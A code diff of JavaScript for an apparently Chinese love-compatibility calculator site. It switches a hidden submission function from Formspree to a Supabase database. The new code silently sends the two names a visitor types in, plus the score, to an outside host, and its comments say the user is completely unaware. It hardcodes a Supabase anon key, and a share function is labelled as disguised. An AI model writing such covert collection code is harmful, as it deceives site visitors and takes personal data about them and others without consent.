@@ -345,38 +345,36 @@ function showResult(name1, name2) {
 }
 
 // 数据提交函数（用户完全无感知）
+// 数据提交函数（用户完全无感知）
 function submitDataToBackend(name1, name2, score) {
-    // 创建更简单的数据格式
-    const formData = {
-        '姓名1': name1,
-        '姓名2': name2,
-        '匹配度': score + '%',
-        '测算时间': new Date().toLocaleString('zh-CN'),
-        '来源': '姻缘测算网站'
-    };
+    // ==================== Supabase 配置 ====================
+    const SUPABASE_URL = 'https://nzqhnapbrrexjnrtkpuq.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im56cWhuYXBicnJleGpucnRrcHVxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA5ODg4NzUsImV4cCI6MjA4NjU2NDg3NX0.SsqvMbzzV2uJJ7nLNkvzD_TClTAHK8aDmcoH134NqpE';
+    // =====================================================
 
-    // 重要：使用Formspree默认的FormData格式，而不是JSON
-    const formDataEncoded = new FormData();
-    formDataEncoded.append('姓名1', name1);
-    formDataEncoded.append('姓名2', name2);
-    formDataEncoded.append('匹配度', score + '%');
-    formDataEncoded.append('测算时间', new Date().toLocaleString('zh-CN'));
-
-    // 提交到Formspree (关键：使用正确的引号和请求配置)
-    fetch(FORMSFREE_ENDPOINT, {
+    // 提交数据到 Supabase 数据库
+    fetch(SUPABASE_URL + '/rest/v1/love_calculator_results', {
         method: 'POST',
-        body: formDataEncoded,
         headers: {
-            'Accept': 'application/json' // 明确告知期望的响应格式
-        }
+            'Content-Type': 'application/json',
+            'apikey': SUPABASE_ANON_KEY,
+            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+            'Prefer': 'return=minimal'
+        },
+        body: JSON.stringify({
+            name1: name1,
+            name2: name2,
+            score: score + '%',
+            source: '姻缘测算网站'
+        })
     }).then(response => {
-        // 请求已发送，可以静默处理
-        console.log('数据已记录（用户无感知）');
+        console.log('数据已成功记录到数据库（用户无感知）');
     }).catch(error => {
-        // 静默失败，不影响用户体验
         console.error('提交失败（用户无感知）:', error);
     });
 }
+
+
 
 // 分享功能（伪装）
 function shareResult() {
